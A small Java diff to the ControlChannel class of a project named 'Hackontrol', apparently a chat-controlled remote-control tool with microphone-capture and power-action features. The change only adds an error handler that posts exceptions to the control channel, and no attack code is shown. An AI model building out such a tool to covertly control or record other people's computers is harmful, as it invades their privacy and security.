@@ -7,6 +7,7 @@ import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.DataLine.Info;
 import javax.sound.sampled.TargetDataLine;
 
+import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.manager.button.ButtonInteraction;
 import com.khopan.hackontrol.manager.button.ButtonManager;
@@ -34,7 +35,8 @@ public class ControlChannel extends HackontrolChannel {
 	private SendHandler handler;
 
 	public ControlChannel() {
-
+		Hackontrol hackontrol = Hackontrol.getInstance();
+		hackontrol.setErrorHandler(this :: handleError);
 	}
 
 	@Override
@@ -147,6 +149,10 @@ public class ControlChannel extends HackontrolChannel {
 
 		this.handler.close();
 		this.handler = null;
+	}
+
+	private void handleError(Thread thread, Throwable Errors) {
+		ErrorUtils.sendErrorMessage(this.channel, Errors);
 	}
 
 	private static enum PowerAction {
